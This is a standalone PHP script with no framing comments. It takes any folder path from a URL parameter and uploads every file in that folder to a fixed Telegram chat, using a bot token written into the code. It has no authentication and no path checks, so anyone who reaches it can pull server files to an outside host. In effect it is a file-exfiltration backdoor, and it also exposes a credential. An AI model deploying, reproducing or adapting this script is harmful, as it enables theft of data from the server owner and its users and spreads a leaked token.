<?php
// Function to send a file to Telegram
function sendFileToTelegram($chatID, $filePath, $botToken) {
    $telegramAPI = "https://api.telegram.org/bot$botToken/sendDocument";

    $params = [
        'chat_id' => $chatID,
        'document' => new CURLFile($filePath)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramAPI);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Specify the bot token and chat ID
$botToken = '6258373847:AAFf3bBhoZ2rCr0wsQ_GsM4vwKUFKe4qles';
$chatID = '1310326055';

// Check if the folder parameter is provided
if (isset($_GET['folder'])) {
    $folderPath = $_GET['folder'];

    // Get all files inside the folder
    $files = glob($folderPath . "/*");

    // Check if any files were found
    if (!empty($files)) {
        // Loop through each file
        foreach ($files as $file) {
            // Send the file to Telegram
            sendFileToTelegram($chatID, $file, $botToken);
        }

        echo "<p>The folder has been sent to Telegram successfully.</p>";
    } else {
        echo "<p>No files found in the specified folder.</p>";
    }
} else {
    echo "<p>No folder parameter provided.</p>";
}
?>
